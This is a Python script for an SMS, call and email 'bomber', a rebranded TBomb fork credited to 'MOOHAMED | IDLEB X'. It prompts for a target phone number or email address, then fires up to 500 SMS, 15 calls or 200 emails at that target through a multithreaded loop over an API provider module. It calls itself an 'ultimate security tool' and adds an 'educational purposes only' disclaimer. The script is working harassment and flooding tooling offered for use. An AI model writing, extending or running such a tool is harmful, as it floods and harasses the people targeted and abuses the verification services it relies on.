#!/usr/bin/python
# -*- coding: UTF-8 -*-

import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import zipfile
from io import BytesIO

from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator
from utils.provider import APIProvider

try:
    import requests
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print(
        "Type `pip3 install -r requirements.txt` to "
        " install all required packages")
    sys.exit(1)


def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes


def get_version():
    try:
        return open(".version", "r").read().strip()
    except Exception:
        return '3.0'


def clr():
    os.system("clear")


def bann_text():
    clr()
    
    # شعار احترافي 3D ضخم
    logo = """
    
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗██████╗ ██╗     ███████╗██████╗     ██╗  ██╗                         ║
║     ██║██╔══██╗██║     ██╔════╝██╔══██╗    ╚██╗██╔╝                         ║
║     ██║██║  ██║██║     █████╗  ██████╔╝     ╚███╔╝                          ║
║     ██║██║  ██║██║     ██╔══╝  ██╔══██╗     ██╔██╗                          ║
║     ██║██████╔╝███████╗███████╗██║  ██║    ██╔╝ ██╗                         ║
║     ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝                         ║
║                                                                               ║
║   ████████╗██████╗  ██████╗ ███╗   ███╗██████╗                             ║
║   ╚══██╔══╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗                            ║
║      ██║   ██████╔╝██║   ██║██╔████╔██║██████╔╝                            ║
║      ██║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗                            ║
║      ██║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝                            ║
║      ╚═╝   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝                             ║
║                                                                               ║
║                    ██╗██████╗ ██╗     ███████╗██████╗                        ║
║                    ██║██╔══██╗██║     ██╔════╝██╔══██╗                       ║
║                    ██║██║  ██║██║     █████╗  ██████╔╝                       ║
║                    ██║██║  ██║██║     ██╔══╝  ██╔══██╗                       ║
║                    ██║██████╔╝███████╗███████╗██║  ██║                       ║
║                    ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝                       ║
║                                                                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║                    🔥 THE ULTIMATE SECURITY TOOL 🔥                          ║
║                                                                               ║
║         ╔═════════════════════════════════════════════════════════╗          ║
║         ║  👑 DEVELOPER: MOOHAMED | IDLEB X                      ║          ║
║         ║  📡 CHANNEL: https://t.me/idlebx2                     ║          ║
║         ║  🎥 YOUTUBE: https://youtube.com/@idlebx              ║          ║
║         ║  🐙 GITHUB: https://github.com/IDLEBX                 ║          ║
║         ╚═════════════════════════════════════════════════════════╝          ║
║                                                                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  ⚡ VERSION: """ + __VERSION__ + """                              ⚡ POWER: ULTIMATE ⚡  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """
    
    print(Fore.RED + logo + Fore.RESET)
    print(Fore.CYAN + "═" * 80 + Fore.RESET)
    mesgdcrt.SuccessMessage("⚡ SYSTEM READY ⚡")
    mesgdcrt.SectionMessage("🔥 " + " ".join(__CONTRIBUTORS__) + " 🔥")
    print(Fore.YELLOW + "█" * 80 + Fore.RESET)
    print()


def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        bann_text()
        mesgdcrt.FailureMessage("⚠️ Poor internet connection detected ⚠️")
        sys.exit(2)


def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()


def get_phone_info():
    while True:
        target = ""
        print(Fore.GREEN + "\n" + "=" * 60 + Fore.RESET)
        cc = input(mesgdcrt.CommandMessage(
            Fore.CYAN + "📱 Enter your country code (Without +): " + Fore.RESET))
        cc = format_phone(cc)
        if not country_codes.get(cc, False):
            mesgdcrt.WarningMessage(
                "❌ The country code ({cc}) is invalid or unsupported".format(cc=cc))
            continue
        target = input(mesgdcrt.CommandMessage(
            Fore.YELLOW + "🎯 Enter the target number: +" + cc + " " + Fore.RESET))
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            mesgdcrt.WarningMessage(
                "❌ The phone number ({target}) is invalid".format(target=target))
            continue
        print(Fore.GREEN + "=" * 60 + Fore.RESET)
        return (cc, target)


def get_mail_info():
    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
    while True:
        target = input(mesgdcrt.CommandMessage("📧 Enter target mail: "))
        if not re.search(mail_regex, target, re.IGNORECASE):
            mesgdcrt.WarningMessage(
                "❌ The mail ({target}) is invalid".format(target=target))
            continue
        return target


def pretty_print(cc, target, success, failed):
    requested = success+failed
    print(Fore.CYAN + "\n" + "═" * 60 + Fore.RESET)
    mesgdcrt.SectionMessage("💣 BOMBING IN PROGRESS 💣")
    mesgdcrt.GeneralMessage("🌐 Target       : +" + cc + " " + target)
    mesgdcrt.GeneralMessage("📨 Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("✅ Successful   : " + str(success))
    mesgdcrt.GeneralMessage("❌ Failed       : " + str(failed))
    mesgdcrt.WarningMessage("⚠️ This tool is for educational purposes only ⚠️")
    mesgdcrt.SuccessMessage("👑 MOOHAMED | IDLEB X - Ultimate Security Tool 👑")
    print(Fore.CYAN + "═" * 60 + Fore.RESET)


def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    bann_text()
    print(Fore.MAGENTA + "\n" + "█" * 60 + Fore.RESET)
    mesgdcrt.SectionMessage("⚙️ GEARING UP THE BOMBER ⚙️")
    mesgdcrt.GeneralMessage("🔌 API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("🎯 Target        : +" + cc + target)
    mesgdcrt.GeneralMessage("💣 Amount        : " + str(count))
    mesgdcrt.GeneralMessage("🧵 Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("⏱️ Delay         : " + str(delay) + " seconds")
    mesgdcrt.WarningMessage("🛡️ This tool is for educational purposes only 🛡️")
    print(Fore.MAGENTA + "█" * 60 + Fore.RESET)
    print()
    input(mesgdcrt.CommandMessage(
        Fore.RED + "⚠️ Press [CTRL+Z] to suspend or [ENTER] to start bombing ⚠️" + Fore.RESET))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("❌ Your country/target is not supported yet ❌")
        mesgdcrt.GeneralMessage("📞 Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "🚫 Bombing limit for your target has been reached 🚫")
                    mesgdcrt.GeneralMessage("⏳ Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                bann_text()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("🎉 BOMBING COMPLETED SUCCESSFULLY! 🎉")
    mesgdcrt.GeneralMessage("👑 Powered by MOOHAMED | IDLEB X 👑")
    time.sleep(2)
    bann_text()
    sys.exit()


def selectnode(mode="sms"):
    mode = mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()

        max_limit = {"sms": 500, "call": 15, "mail": 200}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        elif mode == "mail":
            target = get_mail_info()
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                print(Fore.YELLOW + "\n" + "─" * 50 + Fore.RESET)
                message = ("💣 Enter number of {type} to send (Max {limit}): ".format(type=mode.upper(), limit=limit))
                count = int(input(mesgdcrt.CommandMessage(Fore.RED + message + Fore.RESET)).strip())
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("⚠️ You have requested " + str(count) + " {type}".format(type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "🔄 Automatically capping the value to {limit}".format(limit=limit))
                    count = limit
                delay = float(input(
                    mesgdcrt.CommandMessage(Fore.BLUE + "⏱️ Enter delay time (in seconds): " + Fore.RESET))
                    .strip())
                max_thread_limit = (count//10) if (count//10) > 0 else 1
                max_threads = int(input(
                    mesgdcrt.CommandMessage(
                        Fore.GREEN + "🧵 Enter Number of Threads (Recommended: {max_limit}): "
                        .format(max_limit=max_thread_limit) + Fore.RESET))
                    .strip())
                max_threads = max_threads if (
                    max_threads > 0) else max_thread_limit
                if (count < 0 or delay < 0):
                    raise Exception
                print(Fore.YELLOW + "─" * 50 + Fore.RESET)
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                mesgdcrt.FailureMessage("❌ Read Instructions Carefully! ❌")
                print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("🛑 Received INTR call - Exiting... 🛑")
        sys.exit()


# تعريف الألوان يدوياً لأن Termux قد لا يدعم colorama
class Fore:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

class Style:
    BRIGHT = '\033[1m'
    RESET_ALL = '\033[0m'

mesgdcrt = MessageDecorator("icon")
if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("⚠️ MOOHAMED | IDLEB X requires Python 3 ⚠️")
    sys.exit()

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    pass

__VERSION__ = get_version()
__CONTRIBUTORS__ = ['⚡ MOOHAMED ⚡', '🔥 IDLEB X 🔥', '💀 SpeedX 💀', '👾 t0xic0der 👾', '🎯 scpketer 🎯', '⭐ Stefan ⭐']

ASCII_MODE = False
DEBUG_MODE = False

parser = argparse.ArgumentParser()
parser.add_argument("-sms", "--sms", action="store_true", help="Start SMS bombing")
parser.add_argument("-call", "--call", action="store_true", help="Start Call bombing")
parser.add_argument("-mail", "--mail", action="store_true", help="Start Mail bombing")
parser.add_argument("-v", "--version", action="store_true", help="Show version")

if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print(Fore.CYAN + "╔════════════════════════════╗" + Fore.RESET)
        print(Fore.YELLOW + "║   IDLEB X - VERSION " + __VERSION__ + "   ║" + Fore.RESET)
        print(Fore.CYAN + "╚════════════════════════════╝" + Fore.RESET)
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice = ""
        avail_choice = {
            "1": "SMS",
            "2": "CALL",
            "3": "MAIL"
        }
        try:
            while (choice not in avail_choice):
                clr()
                bann_text()
                print(Fore.CYAN + "\n" + "█" * 60 + Fore.RESET)
                print(Fore.YELLOW + "                    🎯 AVAILABLE OPTIONS 🎯" + Fore.RESET)
                print(Fore.CYAN + "█" * 60 + Fore.RESET + "\n")
                for key, value in avail_choice.items():
                    print(Fore.GREEN + "   ╔════════════════════╗" + Fore.RESET)
                    print(Fore.RED + "   ║  [ " + key + " ] " + value + " BOMB" + " " * (10 - len(value)) + "║" + Fore.RESET)
                    print(Fore.GREEN + "   ╚════════════════════╝" + Fore.RESET)
                print()
                choice = input(mesgdcrt.CommandMessage(Fore.MAGENTA + "👉 Enter Choice : " + Fore.RESET))
            selectnode(mode=avail_choice[choice].lower())
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("🛑 Exiting IDLEB X... 🛑")
            sys.exit()
    sys.exit()
